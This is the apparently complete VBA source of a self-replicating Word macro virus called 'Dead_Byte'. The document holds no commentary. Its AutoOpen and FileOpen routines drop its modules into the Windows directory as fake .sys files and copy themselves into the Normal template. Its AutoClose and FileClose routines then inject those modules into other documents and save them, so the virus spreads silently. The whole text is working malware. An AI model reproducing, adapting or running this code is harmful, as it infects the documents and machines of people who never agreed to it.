   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Dead_Byte"
   Sub Dead_Byte()
      'http://www.deadbyte.narod.ru

   End Sub

   Attribute VB_Name = "FileOpen"
   Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
   Sub FileOpen()
   Dim winda As String
   Dim test_normal As Byte
   Dim t As Byte

   t = 0
   Dialogs(wdDialogFileOpen).Show
   For Each VbComponent In ActiveDocument.VBProject.VBComponents
       If VbComponent.Name = "Dead_Byte" Then t = 255
   Next

   If t = 0 Then GoTo ok

   test_normal = 0
   winda = "                                                                           "
   n = GetWindowsDirectory(winda, 255)
   winda = Left$(winda, n)

   ActiveDocument.VBProject.VBComponents("Dead_Byte").Export winda + "\wdrv1.sys"
   ActiveDocument.VBProject.VBComponents("FileOpen").Export winda + "\wdrv2.sys"
   ActiveDocument.VBProject.VBComponents("AutoOpen").Export winda + "\wdrv3.sys"
   ActiveDocument.VBProject.VBComponents("AutoClose").Export winda + "\wdrv4.sys"
   ActiveDocument.VBProject.VBComponents("FileClose").Export winda + "\wdrv5.sys"

   For i = 1 To WordBasic.CountMacros(0, 0)
    If WordBasic.[MacroName$](i, 0, 0) = "Dead_Byte" Then test_normal = 255
   Next i

   If test_normal = 255 Then GoTo ok
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":Dead_Byte", "Normal:Dead_Byte"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileOpen", "Normal:FileOpen"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileClose", "Normal:FileClose"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Normal:AutoClose"
   ok:
   End Sub


   Attribute VB_Name = "autoopen"
   Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long

   Sub Autoopen()
   Dim winda As String
   Dim test_normal As Byte

   test_normal = 0
   winda = "                                                                           "
   n = GetWindowsDirectory(winda, 255)
   winda = Left$(winda, n)

   ActiveDocument.VBProject.VBComponents("Dead_Byte").Export winda + "\wdrv1.sys"
   ActiveDocument.VBProject.VBComponents("FileOpen").Export winda + "\wdrv2.sys"
   ActiveDocument.VBProject.VBComponents("Autoopen").Export winda + "\wdrv3.sys"
   ActiveDocument.VBProject.VBComponents("AutoClose").Export winda + "\wdrv4.sys"
   ActiveDocument.VBProject.VBComponents("FileClose").Export winda + "\wdrv5.sys"

   For i = 1 To WordBasic.CountMacros(0, 0)
    If WordBasic.[MacroName$](i, 0, 0) = "Dead_Byte" Then test_normal = 255
   Next i

   If test_normal = 255 Then GoTo ok
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":Dead_Byte", "Normal:Dead_Byte"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileOpen", "Normal:FileOpen"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":Fileclose", "Normal:FileClose"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":Autoclose", "Normal:AutoClose"
   ok:
   End Sub


   Attribute VB_Name = "autoclose"
   Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
   Sub AutoClose()
   Dim vir_test As Byte
   Dim winda As String

   vir_test = 0
   For Each VbComponent In ActiveDocument.VBProject.VBComponents
       If VbComponent.Name = "Dead_Byte" Then vir_test = 255
   Next
   If vir_test = 255 Then GoTo V_ok

   winda = "                                                                           "
   n = GetWindowsDirectory(winda, 255)
   winda = Left$(winda, n)
   ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv1.sys"
   ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv2.sys"
   ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv3.sys"
   ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv4.sys"
   ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv5.sys"
   ActiveDocument.Save
   V_ok:
   End Sub

   Attribute VB_Name = "Fileclose"
   Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
   Sub FileClose()
   Dim vir_test As Byte
   Dim winda As String

   vir_test = 0
   For Each VbComponent In ActiveDocument.VBProject.VBComponents
       If VbComponent.Name = "Dead_Byte" Then vir_test = 255
   Next
   If vir_test = 255 Then GoTo V_ok

   winda = "                                                                           "
   n = GetWindowsDirectory(winda, 255)
   winda = Left$(winda, n)
   ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv1.sys"
   ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv2.sys"
   ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv3.sys"
   ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv4.sys"
   ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv5.sys"
   ActiveDocument.Save
   V_ok:
   WordBasic.FileClose
   End Sub
